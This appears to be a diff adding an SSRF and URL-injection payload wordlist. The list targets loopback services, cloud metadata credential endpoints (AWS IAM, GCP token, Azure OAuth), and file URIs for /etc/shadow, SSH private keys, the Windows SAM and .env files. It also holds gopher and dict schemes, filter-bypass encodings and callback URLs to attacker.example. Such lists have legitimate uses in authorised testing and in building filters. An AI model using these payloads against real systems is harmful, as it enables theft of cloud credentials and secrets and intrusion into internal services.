@@ -1,0 +1,298 @@
+# SSRF / URL injection payloads — expand and customize as needed
+# Remove lines starting with '#' to enable payloads
+
+# Localhost / loopback
+http://127.0.0.1
+http://127.0.0.1:80
+http://127.1
+http://localhost
+http://localhost:80
+http://[::1]
+http://[::ffff:127.0.0.1]
+
+# Common internal services and ports
+http://127.0.0.1:22
+http://127.0.0.1:2375        # Docker API
+http://127.0.0.1:2376
+http://127.0.0.1:5000
+http://127.0.0.1:8080
+http://127.0.0.1:5984        # CouchDB
+http://127.0.0.1:9200        # Elasticsearch
+http://127.0.0.1:8500        # Consul
+http://127.0.0.1:3306        # MySQL
+http://127.0.0.1:6379        # Redis
+
+# Cloud metadata endpoints (AWS / GCP / Azure / ECS)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.170.2/metadata/credentials
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/2016-09-02/meta-data/  
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# File URIs (local file access)
+file:///etc/passwd
+file:///var/log/auth.log
+file:///proc/self/environ
+file:///C:/Windows/win.ini
+
+# Gopher / legacy protocols (useful for some SSRF to RCE flows)
+gopher://127.0.0.1:21/_
+gopher://127.0.0.1:70/_
+
+# SMB / FTP / LDAP / SMTP / Redis etc. schemes
+smb://127.0.0.1/share
+ftp://127.0.0.1/
+ldap://127.0.0.1:389/
+smtp://127.0.0.1:25/
+redis://127.0.0.1:6379
+dict://127.0.0.1:2628/
+
+# Docker / API endpoints
+http://localhost:2375/containers/json
+http://127.0.0.1:2375/version
+
+# Common metadata / internal hosts by name
+http://metadata/computeMetadata/v1/
+http://instance-data/latest/meta-data/
+http://169.254.169.254/metadata/  
+
+# Encoded / obfuscated variants and bypass attempts
+http://127.0.0.1%00
+http://127.0.0.1%2F%2E%2E%2F
+http://127.0.0.1#@example.com
+http://example.com@127.0.0.1
+http://127.0.0.1:80@evil.com/
+http://2130706433/             # 127.0.0.1 as decimal
+http://017700000001/           # 127.0.0.1 octal-ish
+http://0x7f000001/            # 127.0.0.1 hex-ish
+
+# IPv6 decimal/encoded variants
+http://[::ffff:7f00:1]
+
+# Parameterized payload forms
+//127.0.0.1/
+///127.0.0.1/
+
+# URLs that may trigger SSRF to cloud metadata or services
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/user-data
+
+# Common telemetry / service endpoints to try
+http://169.254.169.254/2018-02-01/meta-data/
+http://169.254.169.254/latest/meta-data/placement/availability-zone
+
+# Webdav / other schemes
+dav://127.0.0.1/
+
+# Application-specific payload examples (APIs, local services)
+http://127.0.0.1:9000/health
+http://127.0.0.1:6060/debug/pprof/
+
+# Potentially interesting hosts used in SSRF research
+http://169.254.170.2/v2/credentials
+http://169.254.169.254/opc/v1/instance/     # Oracle cloud
+http://100.100.100.200/latest/meta-data/    # AliCloud placeholder
+
+# Short forms and IP edge-cases
+http://127.0.1
+http://127.0.0.2
+http://0.0.0.0
+
+# Redirect / open-redirect patterns to internal services
+http://example.com/%2e%2e%2f127.0.0.1/
+http://example.com/redirect?url=http://127.0.0.1/
+
+# End of list — add or remove payloads as required
+
+# Additional payloads and encoded variants
+http://127.0.0.1:81
+http://127.0.0.1:6565/admin
+http://localhost/admin
+http://127.0.0.1:8000/debug
+http://127.0.0.1/.env
+file:///var/www/html/.env
+file:///C:/Windows/System32/config/sam
+file:///C:/Users/Administrator/Desktop/secret.txt
+http://[fe80::1%25lo0]/
+http://[::1]:80
+http://2130706433/             # decimal 127.0.0.1
+http://0x7f000001/            # hex 127.0.0.1
+http://017700000001/           # octal-ish
+
+# Encoded forms that sometimes bypass naive filtering
+http%3A%2F%2F127.0.0.1
+\u0068\u0074\u0074\u0070\u003A\u002F\u002F127.0.0.1
+http://example.com%2F..%2F127.0.0.1%2F
+
+# Large cloud metadata examples
+http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/instance-profile
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.170.2/v2/credentials/role
+
+# Callback / webhook-ish payloads
+http://attacker.example/ping
+http://attacker.example/cb?x=1
+http://attacker.example/collect?i=1
+
+# protocols that sometimes get through parsing
+gopher://127.0.0.1:70/_
+ldap://127.0.0.1:389/uid=admin,dc=example,dc=local
+ftp://127.0.0.1:21/
+smb://127.0.0.1/share/secret
+
+# End additional
+
+# More internal service discovery payloads
+http://127.0.0.1:3000
+http://127.0.0.1:4000
+http://127.0.0.1:5001
+http://127.0.0.1:8888
+http://127.0.0.1:9090
+http://127.0.0.1:9999
+http://127.0.0.1:11211        # Memcached
+http://127.0.0.1:27017        # MongoDB
+http://127.0.0.1:50070        # Hadoop NameNode
+http://127.0.0.1:8086         # InfluxDB
+
+# Kubernetes and container orchestration
+http://127.0.0.1:10250        # Kubelet API
+http://127.0.0.1:6443         # Kubernetes API
+http://kubernetes.default
+http://kubernetes.default.svc
+http://kubernetes.default.svc.cluster.local
+
+# Jenkins and CI/CD endpoints
+http://127.0.0.1:8080/jenkins/
+http://127.0.0.1:8080/job/
+
+# Database UI panels
+http://127.0.0.1:5601         # Kibana
+http://127.0.0.1:3000/d/      # Grafana dashboard
+http://127.0.0.1:15672        # RabbitMQ management
+http://127.0.0.1:6379/admin   # Redis-Commander
+
+# AWS specific metadata
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/security-groups
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/dynamic/instance-identity/rsa2048
+
+# GCP specific metadata
+http://metadata.google.internal/computeMetadata/v1/instance/cpu-platform
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/nat-ip
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
+
+# Azure specific metadata
+http://169.254.169.254/metadata/instance?api-version=2019-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
+
+# Docker socket exploitation
+unix:///var/run/docker.sock
+http://localhost/v1.40/containers/json
+
+# Apache specific paths
+http://127.0.0.1:80/server-status
+http://127.0.0.1:80/server-info
+http://localhost/server-status?auto
+
+# Nginx and web server paths
+http://127.0.0.1:80/nginx_status
+
+# SSH/Telnet/SSH key disclosure
+file:///root/.ssh/id_rsa
+file:///home/*/ssh/.id_rsa
+file:///etc/ssh/ssh_host_rsa_key
+
+# AWS S3 and services
+file:///var/lib/cloud/instance/user-data
+http://bucket-name.s3.amazonaws.com/
+
+# Common config file paths
+file:///etc/config
+file:///etc/hosts
+file:///etc/hostname
+file:///etc/shadow
+file:///etc/sudoers
+file:///proc/self/cwd/config.php
+
+# Java specific paths
+http://127.0.0.1:8080/actuator
+http://127.0.0.1:8080/actuator/env
+http://127.0.0.1:8080/health
+
+# Python Flask/Django debug
+http://127.0.0.1:5000/__debug__
+http://127.0.0.1:5000/debug
+http://127.0.0.1:8000/admin
+
+# Node.js PM2/Express
+http://127.0.0.1:9000/
+http://127.0.0.1:9229/json
+
+# Prometheus monitoring
+http://127.0.0.1:9090/graph
+http://127.0.0.1:9100/metrics
+
+# Splunk
+http://127.0.0.1:8000/
+
+# Jira / Confluence / Atlassian
+http://127.0.0.1:8080/jira/
+http://127.0.0.1:8090/confluence/
+
+# WordPress / CMS
+http://127.0.0.1:80/wp-admin/
+http://127.0.0.1:80/index.php
+
+# MySQL UI (phpMyAdmin, etc.)
+http://127.0.0.1:80/phpmyadmin/
+
+# Mail servers
+http://127.0.0.1:25/
+http://127.0.0.1:587/
+http://127.0.0.1:110/
+
+# VNC / Remote services
+http://127.0.0.1:5900/
+http://127.0.0.1:5901/
+
+# Fastcgi / FPM
+http://127.0.0.1:9000/status
+
+# DNS and service discovery
+http://127.0.0.1:53/
+http://127.0.0.1:5353/
+
+# Unusual bypasses
+http://127。0。0。1/              # Full-width period (Unicode)
+http://127․0․0․1/              # One dot leader
+http://localhost.localdomain
+http://127.0.0.1.xip.io/
+http://127-0-0-1.com/
+
+# HTTP basic auth bypass attempts
+http://admin:admin@127.0.0.1/
+http://guest:guest@127.0.0.1/
+http://admin:password@127.0.0.1/
+
+# Fragment and parameter encoding bypasses
+http://127.0.0.1#.attacker.com
+http://127.0.0.1%23@attacker.com
+http://127.0.0.1%00.attacker.com
+
+# Protocol handler bypasses
+data:text/html,<script>alert(1)</script>
+jar:http://127.0.0.1!/
+netdoc:http://127.0.0.1/
+
+# End new payloads
